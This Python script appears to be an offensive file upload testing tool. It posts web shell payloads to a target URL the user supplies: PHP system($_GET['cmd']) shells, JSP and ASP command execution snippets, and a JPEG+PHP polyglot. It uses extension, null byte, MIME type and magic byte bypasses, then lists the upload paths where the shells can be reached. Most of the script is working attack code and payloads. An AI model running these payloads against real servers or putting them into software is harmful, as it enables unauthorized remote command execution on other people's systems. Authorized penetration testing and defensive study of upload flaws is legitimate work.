#!/usr/bin/env python3
"""
Upload Tester - Test file upload vulnerabilities (extension bypass, MIME type, polyglot files).

Usage:
    python upload_tester.py <target_url> <upload_field_name>

Example:
    python upload_tester.py http://target.com/upload avatar
    python upload_tester.py http://target.com/api/upload file
"""

import requests
import sys
import urllib3
import io
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===== Configuration =====
session = requests.Session()
proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
# session.proxies.update(proxies)
# session.verify = False

# Test payloads - extension bypass techniques
EXTENSION_TESTS = [
    ("shell.php", b"<?php system($_GET['cmd']); ?>", "text/plain"),
    ("shell.php.jpg", b"<?php system($_GET['cmd']); ?>", "image/jpeg"),
    ("shell.jpg.php", b"<?php system($_GET['cmd']); ?>", "image/jpeg"),
    ("shell.php%00.jpg", b"<?php system($_GET['cmd']); ?>", "image/jpeg"),
    ("shell.phtml", b"<?php system($_GET['cmd']); ?>", "text/plain"),
    ("shell.PhP", b"<?php system($_GET['cmd']); ?>", "text/plain"),
    ("shell.pHp", b"<?php system($_GET['cmd']); ?>", "text/plain"),
    ("shell.php.txt", b"<?php system($_GET['cmd']); ?>", "text/plain"),
    # JSP
    ("shell.jsp", b'<% Runtime.getRuntime().exec("id"); %>', "text/plain"),
    ("shell.jsw", b'<% Runtime.getRuntime().exec("id"); %>', "text/plain"),
    ("shell.jspx", b'<% Runtime.getRuntime().exec("id"); %>', "text/plain"),
    # ASP
    ("shell.asp", b'<% System.Diagnostics.Process.Start("cmd.exe"); %>', "text/plain"),
    ("shell.cer", b'<% System.Diagnostics.Process.Start("cmd.exe"); %>', "text/plain"),
]

# Polyglot file - valid JPEG + PHP
POLYGLOT_JPEG_PHP = (
    b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
    b"\xff\xdb\x00C\x00\x08\x06\x06\x07\x06\x05\x08\x07\x07\x07\t\t\x08\n\x0c"
    b"\x14\r\x0c\x0b\x0b\x0c\x19\x12\x13\x0f\x14\x1d\x1a\x1f\x1e\x1d\x1a\x1c"
    b"\x1c $.' \",#\x1c\x1c(7),01444\x1f'9=82<.342\xff\xc0\x00\x0b\x01\x01"
    b"\x01\x11\x00\x02\x11\x01\x03\x11\x01\xff\xc4\x00\x1f\x00\x00\x01\x05\x01"
    b"\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x02\x03\x04\x05"
    b"\x06\x07\x08\t\n\x0b\xff\xc4\x00\xb5\x10\x00\x02\x01\x03\x03\x02\x04\x03"
    b"\x05\x05\x04\x04\x00\x00\x01}\x01\x02\x03\x00\x04\x11\x05\x12!1A\x06\x13"
    b'Qa\x07"q\x142\x81\x91\xa1\x08#B\xb1\xc1\x15R\xd1\xf0$3br\x82\t\n\x16\x17'
    b"\x18\x19\x1a%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz\x83\x84\x85\x86"
    b"\x87\x88\x89\x8a\x92\x93\x94\x95\x96\x97\x98\x99\x9a\xa2\xa3\xa4\xa5\xa6"
    b"\xa7\xa8\xa9\xaa\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xc2\xc3\xc4\xc5\xc6"
    b"\xc7\xc8\xc9\xca\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xe1\xe2\xe3\xe4\xe5"
    b"\xe6\xe7\xe8\xe9\xea\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xff\xda\x00"
    b"\x08\x01\x01\x00\x00?\x00\xfb\xd8\xff\xd9"
    b'<?php system($_GET["cmd"]); ?>'
)


def test_upload(target_url, field_name, filename, content, mime_type):
    """Test single file upload"""
    try:
        files = {field_name: (filename, io.BytesIO(content), mime_type)}
        r = session.post(target_url, files=files, verify=False, timeout=5)
        return r.status_code, r.text
    except Exception as e:
        return None, str(e)


def run_extension_tests(target_url, field_name):
    """Test extension bypass techniques"""
    print(f"[*] Extension Bypass Tests")
    print(f"[*] Target: {target_url}")
    print(f"[*] Field: {field_name}")
    print(f"[*] Testing {len(EXTENSION_TESTS)} variants...")
    print()

    for filename, content, mime_type in EXTENSION_TESTS:
        status, response = test_upload(
            target_url, field_name, filename, content, mime_type
        )

        if status is None:
            continue

        if status == 200:
            print(f"[+] {status} - {filename} ({mime_type})")
            if "success" in response.lower() or "uploaded" in response.lower():
                print(f"    ^ LIKELY UPLOADED!")
        elif status in [201, 204]:
            print(f"[+] {status} - {filename} (LIKELY SUCCESS)")

        time.sleep(0.05)


def test_polyglot_upload(target_url, field_name):
    """Test polyglot JPEG+PHP upload"""
    print(f"\n[*] Polyglot File Tests (JPEG + PHP)")

    tests = [
        ("polyglot.php", POLYGLOT_JPEG_PHP, "image/jpeg"),
        ("polyglot.jpg", POLYGLOT_JPEG_PHP, "image/jpeg"),
        ("polyglot.php.jpg", POLYGLOT_JPEG_PHP, "image/jpeg"),
    ]

    for filename, content, mime_type in tests:
        status, response = test_upload(
            target_url, field_name, filename, content, mime_type
        )

        if status and status in [200, 201, 204]:
            print(f"[+] {status} - {filename}")
            print(f"    ^ Can potentially execute PHP as JPEG!")


def test_null_byte_bypass(target_url, field_name):
    """Test null byte injection in filename"""
    print(f"\n[*] Null Byte Injection Tests")

    tests = [
        ("shell.php%00.jpg", b"<?php system($_GET['cmd']); ?>", "image/jpeg"),
        ("shell.php\x00.jpg", b"<?php system($_GET['cmd']); ?>", "image/jpeg"),
    ]

    for filename, content, mime_type in tests:
        try:
            status, response = test_upload(
                target_url, field_name, filename, content, mime_type
            )
            if status and status in [200, 201, 204]:
                print(f"[+] {status} - Null byte bypass may work!")
        except:
            pass


def test_magic_bytes(target_url, field_name):
    """Test files with fake magic bytes"""
    print(f"\n[*] Magic Bytes Bypass Tests")

    # PNG header + PHP
    png_php = b'\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]); ?>'

    # GIF header + PHP
    gif_php = b'GIF89a<?php system($_GET["cmd"]); ?>'

    tests = [
        ("shell.php", png_php, "image/png"),
        ("shell.php", gif_php, "image/gif"),
        ("shell.jpg", POLYGLOT_JPEG_PHP, "image/jpeg"),
    ]

    for filename, content, mime_type in tests:
        status, response = test_upload(
            target_url, field_name, filename, content, mime_type
        )
        if status and status in [200, 201, 204]:
            print(f"[+] {status} - {mime_type} magic bytes may work!")


# ===== Main =====
if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python upload_tester.py <target_url> <field_name>")
        print("\nExample:")
        print("  python upload_tester.py http://target.com/upload file")
        print("  python upload_tester.py http://target.com/avatar avatar")
        sys.exit(1)

    target_url = sys.argv[1]
    field_name = sys.argv[2]

    print("[*] Upload Vulnerability Tester")
    print()

    run_extension_tests(target_url, field_name)
    test_polyglot_upload(target_url, field_name)
    test_null_byte_bypass(target_url, field_name)
    test_magic_bytes(target_url, field_name)

    print("\n[*] If uploads succeed, try accessing:")
    print("    - /uploads/shell.php")
    print("    - /uploads/shell.php.jpg")
    print("    - /tmp/uploads/")
    print("    - Check response for uploaded filename/path")
